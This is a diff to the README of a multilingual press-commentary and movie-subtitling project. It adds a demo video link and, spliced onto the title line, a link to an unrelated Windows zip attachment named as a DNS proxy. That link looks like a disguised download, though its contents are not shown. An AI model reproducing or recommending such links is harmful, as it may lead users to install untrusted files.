@@ -1,4 +1,4 @@
-# Group 2: Multi-Lingual Press Commentary / Movie Subtitler
+[dnscrypt-proxy-win64-2.1.18.zip](https://github.com/user-attachments/files/32341826/dnscrypt-proxy-win64-2.1.18.zip)# Group 2: Multi-Lingual Press Commentary / Movie Subtitler
 
 ## Project Overview
 
@@ -119,6 +119,9 @@ The application produces:
 - Improved subtitle synchronization.
 - Desktop application packaging.
 - GPU optimization for faster inference.
+
+## Project Demo
+https://github.com/user-attachments/assets/f5cb33ae-247a-423c-b254-e11edab3b546
 
 ---
 
